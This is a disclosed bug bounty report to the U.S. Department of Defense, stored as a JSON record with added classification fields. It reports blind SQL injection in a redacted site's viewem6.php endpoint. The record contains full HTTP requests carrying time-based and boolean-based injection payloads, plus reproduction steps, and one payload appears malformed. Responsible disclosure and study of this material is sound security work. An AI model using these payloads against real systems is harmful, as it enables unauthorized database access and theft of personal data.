{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "alyssa_herrera ",
  "title": "Blind SQL injection on \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
  "content": "\nSummary:\nI discovered that a post request made to https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/elist/viewem6.php is vulnerable to SQL injection and is quite clearly vulnerable as I was able to induce a 2 second hang on the web page. Additionally I was able to discover the mysql version with a true/false condition.\nDescription:\nA post request is made to hhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/elist/viewem6.php with the following parameters,\nrememail=test@att.net\nAs to not break the rules of engagement, I used a sleep query and Boolean based commands to clearly and definitively demonstrate the vulnerability and the severity of it.\n## Impact\nCritical\n## Step-by-step Reproduction Instructions\nIn burp suite we can set a repeater request as followed. Target set as https://\u2588\u2588\u2588\u2588/\nPOST /elist/viewem6.php HTTP/1.1\nHost: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/elist/email_escribe.php?type=R\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 61\nCookie: v1st=A9532F64A9E711AF; PHPSESSID=1796d85a30d3addf5934c1f0fafec529\nConnection: close\nUpgrade-Insecure-Requests: 1\nrememail=test@att.net'%2b(select*from(select(sleep(2)))a)%2b'\nObserve a 2 second hang.\nvs\nPOST /elist/viewem6.php HTTP/1.1\nHost: \u2588\u2588\u2588\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/elist/email_escribe.php?type=R\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 61\nCookie: v1st=A9532F64A9E711AF; PHPSESSID=1796d85a30d3addf5934c1f0fafec529\nConnection: close\nUpgrade-Insecure-Requests: 1\nrememail=test@att.net'%2b(select*from(select(sleep(0)))a)%2b'\nAdditionally we can detect version of the mysql by using the following request\nPOST /elist/viewem6.php HTTP/1.1\nHost: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://\u2588\u2588\u2588\u2588\u2588\u2588/elist/email_escribe.php?type=R\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 61\nCookie: v1st=A9532F64A9E711AF; PHPSESSID=1796d85a30d3addf5934c1f0fafec529\nConnection: close\nUpgrade-Insecure-Requests: 1\nrememail=test@att.net'%2bIF(MID(@@version,1,1)=4,sleep(2),1)=2%2b'\nvs\nPOST /elist/viewem6.php HTTP/1.1\nHost: \u2588\u2588\u2588\u2588\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://\u2588\u2588\u2588\u2588\u2588/elist/email_escribe.php?type=R\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 61\nCookie: v1st=A9532F64A9E711AF; PHPSESSID=1796d85a30d3addf5934c1f0fafec529\nConnection: close\nUpgrade-Insecure-Requests: 1\nrememail=test@att.net'%2bIF(MID(@@version,1,1)=5sleep(2),1)=2%2b'\nWe can then discover the version of the DB, we can use queries like this to further discover data.To specify these two queries will demonstrate a true or false query. True scenario will result in the Database sleeping for 2 seconds, false it won't sleep, using this logic, I was able to evaluate if the website's Mysql version started with 4 or 5. As I said above it was possible to escalate from simple time queries to reading data and executing other commands by combing sleep queries with true/false statements.\nProduct, Version, and Configuration (If applicable)\nN/a\n## Suggested Mitigation/Remediation Actions\nSanitize user input and use stored procedures\nImpact\nAn attacker would be able to read data and steal data in the Database on this website leading to PII leakage and additionally may lead to the website being compromised completely\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1570575360,
  "report_url": "https://hackerone.com/reports/313037",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Send a POST request to https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/elist/viewem6.php with the parameter 'rememail=test@att.net'%2b(select*from(select(sleep(2)))a)%2b'' to induce a 2-second delay in the response."
    ],
    [
      2,
      "Send a POST request to https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/elist/viewem6.php with the parameter 'rememail=test@att.net'%2bIF(MID(@@version,1,1)=4,sleep(2),1)=2%2b'' to determine the MySQL version by observing the response delay."
    ]
  ],
  "vuln_description": "The application is vulnerable to blind SQL injection via the 'rememail' parameter in the POST request to viewem6.php. This allows an attacker to execute arbitrary SQL queries, extract database information (such as the MySQL version), and potentially access sensitive data.",
  "reason": "The vulnerability involves straightforward SQL injection techniques (time-based and boolean-based) without requiring complex application state manipulation or novel logic. The attack is based on well-known SQL injection methods and does not involve multiple components or subtle interactions.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The SQL injection vulnerability involves manipulating input parameters to induce delays or extract database information, which is not directly related to authentication or authorization bypasses. The methodology described focuses on testing authorization boundaries by swapping user sessions or resource IDs, not on input validation vulnerabilities like SQL injection.",
    "is_detectable": false
  }
}